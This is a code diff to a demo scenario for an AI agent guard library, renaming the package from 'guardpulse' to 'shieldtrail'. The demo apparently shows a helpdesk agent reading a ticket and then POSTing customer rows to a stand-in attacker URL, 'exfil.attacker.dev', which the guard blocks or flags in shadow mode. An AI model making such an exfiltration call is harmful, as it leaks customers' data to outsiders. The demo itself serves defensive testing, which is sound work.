@@ -10,12 +10,12 @@ import {
   type Exporter,
   GuardBlockedError,
   type GuardEvent,
-  type GuardPulse,
+  type ShieldTrail,
   guardMcpClient,
   type Mode,
   shadowReport,
   type ShadowReport,
-} from 'guardpulse';
+} from 'shieldtrail';
 
 export type DemoMode = 'off' | Exclude<Mode, 'off'>;
 
@@ -34,7 +34,7 @@ export interface DemoResult {
   chain?: Chain;
   drift: GuardEvent['findings'];
   report?: ShadowReport;
-  guard?: GuardPulse;
+  guard?: ShieldTrail;
 }
 
 export const ATTACKER = 'https://exfil.attacker.dev/collect';
@@ -110,7 +110,7 @@ export async function runScenario(mode: DemoMode, opts: { onStep?: (s: Step) => 
   const statusOf = (e?: GuardEvent): Step['status'] =>
     e?.decision?.action === 'would_block' ? 'would_block' : e?.decision?.action === 'alert' ? 'alert' : 'ok';
 
-  // ── without GuardPulse: the agent calls tools and the network directly ──
+  // ── without ShieldTrail: the agent calls tools and the network directly ──
   if (mode === 'off') {
     const mcp = helpdeskMcp();
     const ticket = JSON.parse(text(await mcp.callTool({ name: 'tickets.read', arguments: { id: 4521 } })));
@@ -126,7 +126,7 @@ export async function runScenario(mode: DemoMode, opts: { onStep?: (s: Step) => 
     return { mode, steps, leaked, drift: [] };
   }
 
-  // ── with GuardPulse ──
+  // ── with ShieldTrail ──
   const baseline = await learnBaseline();
   const guard = createGuard({ mode, allowedDomains: ALLOWED_DOMAINS, observers: [baseline.observe], fetch: network, exporters: opts.exporters });
   const trace = guard.startTrace(TASK);
@@ -147,7 +147,7 @@ export async function runScenario(mode: DemoMode, opts: { onStep?: (s: Step) => 
 
   try {
     await trace.fetch(ATTACKER, { method: 'POST', body: rows });
-    emit('POST customers to exfil.attacker.dev', mode === 'shadow' ? 'Shadow mode: request went through, GuardPulse would have blocked it' : 'sent', statusOf(await last()));
+    emit('POST customers to exfil.attacker.dev', mode === 'shadow' ? 'Shadow mode: request went through, ShieldTrail would have blocked it' : 'sent', statusOf(await last()));
   } catch (err) {
     if (!(err instanceof GuardBlockedError)) throw err;
     emit('POST customers to exfil.attacker.dev', `BLOCKED by ${err.decision.ruleId}. Request never left the app.`, 'blocked');
